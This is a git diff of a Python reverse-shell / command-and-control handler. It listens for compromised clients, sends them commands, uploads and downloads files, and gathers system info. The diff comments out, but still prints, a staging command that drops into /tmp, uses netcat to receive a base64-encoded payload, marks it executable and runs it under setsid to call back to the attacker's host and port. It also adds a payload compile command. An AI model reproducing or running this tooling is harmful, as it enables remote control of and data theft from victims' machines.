@@ -1,9 +1,12 @@
-#!/usr/bin/python3
+#!python3
 
-from modules.utils import send_file, chk_payload
+from modules.utils import send_file, chk_payload, local_shell
 from modules.sysinfo import SystemInfoGatherer
 from modules.nethelper import netshell_loop, pretty, listen
 from threading import Thread
+
+import pip._vendor.rich
+import subprocess
 import logging
 import socket
 import time
@@ -28,6 +31,9 @@ class NetShell(cmd.Cmd):
         self.shell_active = True
 
         Thread(target=self._is_alive).start()
+
+    def default(self, line):
+        local_shell(line)
 
     def precmd(self, line):
         """Hook method executed just before the command line is
@@ -84,21 +90,21 @@ class NetShell(cmd.Cmd):
                 logging.error("No such file or directory")
                 return
             if line == "/":
-                path = "root folder"
+                path = "root"
             else:
                 path = pretty(self.server.send_command(f"realpath {line}"))
-
-        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n")
+        ls = "\n".join(ls.split("\n")[1:])
+        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n{ls}\n")
     
-    def do_send(self, line):
-        check = self.server.send_command(f"sendingfile/{line}")
+    def do_send(self, line): # DOES NOT WORK
+        check = self.server.send_command(f"sendingfile {line}")
         if b"ready" in check:
             with open(line, 'rb') as f:
                 while (chunk := f.read(1024)):
                     self.server.client_socket.send(chunk)
 
     def do_get(self, line):
-        contents = pretty(self.server.send_command(f"gettingfile/{line}"))
+        contents = pretty(self.server.send_command(f"gettingfile {line}"))
         if contents:
             with open(line.split("/")[-1], 'w') as f:
                 f.write(f"{contents}\n")
@@ -134,6 +140,8 @@ class LocalShell(cmd.Cmd):
             logging.warning('Warning: Binary file "payload" is not present.')
             chk_payload(PROJ_DIR)
 
+    def default(self, line):
+        local_shell(line)
 
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
@@ -153,6 +161,9 @@ class LocalShell(cmd.Cmd):
         <--Commands start here-->
     """
 
+    def do_compile(self, line):
+        chk_payload(PROJ_DIR)
+
     def do_listen(self, line):
         if not line:
             host, port = ("0.0.0.0", 4242)
@@ -168,18 +179,18 @@ class LocalShell(cmd.Cmd):
         # TODO: Make it so that if there 
         sock.sysinfo.is_nc = pretty(sock.send_command("which nc")) # This doesnt work
         if sock.sysinfo.is_nc:
-            logging.info(f"Sending payload..")
+            logging.info(f"Sending payload")
 
-            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
-                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
-                                            f"./payload {host} {port}'\n"\
-                                            .encode())
+            # sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
+            #                                 f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
+            #                                 f"./payload {host} {port}'\n"\
+            #                                 .encode())
 
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
-            logging.info(f"Payload sent. Starting listener..")
+            # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+            logging.debug(f"Payload sent. Starting listener")
             
             sock = listen(host, port, 1)
             if not sock: return
